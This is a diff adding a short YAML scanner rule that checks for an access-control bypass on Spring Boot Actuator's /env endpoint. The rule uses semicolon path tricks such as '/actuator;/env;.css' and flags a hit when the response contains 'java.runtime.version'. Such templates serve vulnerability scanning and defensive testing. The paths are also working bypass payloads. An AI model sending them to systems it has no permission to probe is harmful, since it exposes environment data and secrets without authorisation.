@@ -1,0 +1,15 @@
+name: Find-Actuator API bypass未授权访问
+rules:
+  - method: GET
+    poc: 
+        - /actuator;/env;.css
+        - /api/actuator;/env;.css
+        - /api;/env;.css
+        - /;/env;.css
+    body:
+        
+    check: 'java.runtime.version'
+detail:
+  author: LittleBear4   
+  links: 
+    - https://xxxxxx
